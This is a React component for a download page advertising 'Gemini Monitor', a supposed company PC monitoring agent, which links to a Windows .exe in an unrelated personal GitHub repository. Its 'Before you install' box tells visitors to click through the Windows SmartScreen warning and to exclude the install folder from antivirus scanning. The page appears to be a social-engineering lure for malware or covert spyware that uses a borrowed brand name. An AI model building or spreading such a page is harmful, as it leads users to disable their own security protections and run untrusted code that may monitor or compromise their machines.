'use client';

import { useEffect, useRef, useState } from 'react';
import { AlertTriangle, Check, Copy, Download } from 'lucide-react';
import { MotionConfig, motion } from 'motion/react';

const DOWNLOAD_URL =
  'https://github.com/abdullahshkir/Erangle/releases/download/v1.0.1/GeminiMonitorSetup.exe';
const INSTALL_PATH = 'C:\\Program Files (x86)\\Gemini';

export default function HomePage() {
  const [copied, setCopied] = useState(false);
  const timeoutRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  useEffect(() => {
    return () => {
      if (timeoutRef.current) {
        clearTimeout(timeoutRef.current);
      }
    };
  }, []);

  const handleCopyPath = async () => {
    let didCopy = false;

    if (typeof navigator !== 'undefined' && navigator.clipboard?.writeText) {
      try {
        await navigator.clipboard.writeText(INSTALL_PATH);
        didCopy = true;
      } catch {
        didCopy = false;
      }
    }

    if (!didCopy && typeof document !== 'undefined') {
      const textarea = document.createElement('textarea');
      textarea.value = INSTALL_PATH;
      textarea.setAttribute('readonly', '');
      textarea.className = 'fixed opacity-0 pointer-events-none';
      document.body.appendChild(textarea);
      textarea.select();
      try {
        didCopy = document.execCommand('copy');
      } finally {
        document.body.removeChild(textarea);
      }
    }

    if (didCopy) {
      setCopied(true);
      if (timeoutRef.current) {
        clearTimeout(timeoutRef.current);
      }
      timeoutRef.current = setTimeout(() => {
        setCopied(false);
      }, 2000);
    }
  };

  return (
    <MotionConfig reducedMotion="user">
      <div className="min-h-screen w-full bg-[#0f0f14] text-zinc-100 flex items-center justify-center px-4 py-10 sm:px-6 sm:py-16">
        <motion.main
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.25, ease: [0.16, 1, 0.3, 1] }}
          className="w-full max-w-[520px] rounded-2xl bg-[#16161e] border border-white/10 p-6 sm:p-10 shadow-2xl shadow-black/40"
        >
          <header className="text-center">
            <h1 className="text-3xl sm:text-4xl font-semibold tracking-tight text-white text-balance">
              Gemini Monitor
            </h1>
            <p className="mt-2.5 text-sm sm:text-base text-zinc-400 tracking-[0.01em]">
              Company PC monitoring agent by Gemini.
            </p>
          </header>

          <section className="mt-8 flex flex-col items-center">
            <a
              href={DOWNLOAD_URL}
              download
              className="inline-flex w-full sm:w-auto min-h-[52px] items-center justify-center gap-2.5 rounded-xl bg-[#A78BFA] px-8 py-3.5 text-base font-semibold text-[#0f0f14] whitespace-nowrap transition-colors duration-150 hover:bg-[#C4B5FD] active:bg-[#9061F9] focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-[#A78BFA] focus-visible:ring-offset-2 focus-visible:ring-offset-[#16161e]"
            >
              <Download className="h-5 w-5 shrink-0" aria-hidden="true" />
              <span>Download for Windows</span>
            </a>

            <p className="mt-3 text-xs sm:text-[13px] text-zinc-400 tabular-nums">
              Windows 10 &amp; 11 · ~1 MB
            </p>
          </section>

          <section
            aria-labelledby="setup-note-title"
            className="mt-8 rounded-xl bg-[#FEF9C3] border border-[#FDE047] p-5 text-[#1c1917]"
          >
            <div className="flex items-center gap-2">
              <AlertTriangle
                className="h-4 w-4 shrink-0 text-[#92400E]"
                aria-hidden="true"
              />
              <h2
                id="setup-note-title"
                className="text-sm font-semibold tracking-tight text-[#1c1917]"
              >
                Before you install
              </h2>
            </div>

            <div className="mt-2.5 space-y-2 text-[13.5px] sm:text-sm leading-relaxed text-[#292524]">
              <p>
                If Windows SmartScreen shows a warning, click &ldquo;More info&rdquo; then
                &ldquo;Run anyway&rdquo;.
              </p>
              <p>If your antivirus blocks it, allow (exclude) this folder:</p>
            </div>

            <div className="mt-3 flex items-stretch gap-2">
              <code className="flex flex-1 min-w-0 min-h-[40px] items-center overflow-x-auto whitespace-nowrap rounded-lg bg-white/80 border border-amber-900/15 px-3 py-2 font-mono text-xs sm:text-[13px] text-[#18181b] select-all">
                {INSTALL_PATH}
              </code>

              <button
                type="button"
                onClick={handleCopyPath}
                aria-label={copied ? 'Copied installation path' : 'Copy installation path'}
                className="inline-flex min-h-[40px] shrink-0 items-center justify-center gap-1.5 rounded-lg bg-[#18181b] px-3.5 py-2 text-xs font-medium text-white whitespace-nowrap transition-colors duration-150 hover:bg-[#27272a] active:bg-[#09090b] focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-[#18181b] focus-visible:ring-offset-2 focus-visible:ring-offset-[#FEF9C3] cursor-pointer"
              >
                {copied ? (
                  <>
                    <Check className="h-3.5 w-3.5 shrink-0 text-[#A78BFA]" aria-hidden="true" />
                    <span>Copied</span>
                  </>
                ) : (
                  <>
                    <Copy className="h-3.5 w-3.5 shrink-0" aria-hidden="true" />
                    <span>Copy</span>
                  </>
                )}
              </button>
            </div>
          </section>
        </motion.main>
      </div>
    </MotionConfig>
  );
}
